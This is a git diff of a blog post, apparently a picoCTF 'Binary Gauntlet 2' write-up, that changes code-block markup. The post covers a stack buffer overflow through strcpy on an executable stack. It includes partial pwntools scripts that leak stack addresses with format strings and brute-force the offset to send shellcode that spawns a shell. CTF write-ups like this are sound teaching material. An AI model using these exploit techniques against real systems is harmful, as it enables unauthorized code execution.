@@ -5,8 +5,7 @@ title: Binary Gauntlet 2
         href="https://challenge-files.picoctf.net/c_wily_courier/df2d86055c40796590b700b52efd29268659a883546d326588b14ef4088c1238/gauntlet">here</a>.
 </p>
 <p>The problem didn't provide a source code so I had to decompile it as below.</p>
-{% raw %}
-<pre><code>
+{% highlight c %}
 undefined8 main(void)
 {
   char local_78 [104];
@@ -22,8 +21,7 @@ undefined8 main(void)
   strcpy(local_78,local_10);
   return 0;
 }
-</code></pre>
-{% endraw %}
+{% endhighlight %}
 <p>
     Doing a checksec revealed that the stack was executable, which meant that I could put shellcode in the stack and
     execute it
@@ -39,8 +37,7 @@ undefined8 main(void)
 </p>
 <img src="stack_gdb.png" alt="">
 <p>So I wrote the exploit code as below and it worked in my local environment.</p>
-{% raw %}
-<pre><code>
+{% highlight python %}
 #!/usr/bin/python3
 from pwn import *
 
@@ -54,15 +51,13 @@ def ex():
     p.interactive()
 
 if __name__ == "__main__": ex()
-</code></pre>
-{% endraw %}
+{% endhighlight %}
 <p>
     However it didn't work for the remote environment as the leaked value in that environment was some random value
     not related to the stack. Thus, to investigate this, I devised a script as below that could leak the values in the
     stack since I couldn't use gdb on a process running somewhere remote.
 </p>
-{% raw %}
-<pre><code>
+{% highlight python %}
 #!/usr/bin/python3
 from pwn import *
 def ex(): 
@@ -75,17 +70,15 @@ def ex():
         if i != 6: payload += b"."
     p.sendline(payload)
     p.interactive()
-if __name__ == "__main__": ex() 
-</code></pre>
-{% endraw %}
+if __name__ == "__main__": ex()
+{% endhighlight %}
 <p>
     This script revealed that the stack location leaked by <code>printf("%6$p")</code> had a value related to the stack.
     Still, the offset from that value to the address of <code>local_78</code> remained unknown. So I wrote another
     script
     that would iterate through every single 8-byte aligned offset from 0 to 400, essentially brute-forcing the offset.
 </p>
-{% raw %}
-<pre><code>
+{% highlight python %}
 #!/usr/bin/python3
 from pwn import *
 
@@ -100,7 +93,6 @@ def ex():
         p.sendline(encode(asm(shellcraft.sh()), avoid="\x0a\x00").ljust(0x78, b"A") + p64(buf_addr))
         p.interactive()
         p.close()
-if __name__ == "__main__": ex() 
-        </code></pre>
-{% endraw %}
+if __name__ == "__main__": ex()
+{% endhighlight %}
 <p>The script succeeded when the offset was 0x158, or when <code>i</code> was 43.</p>
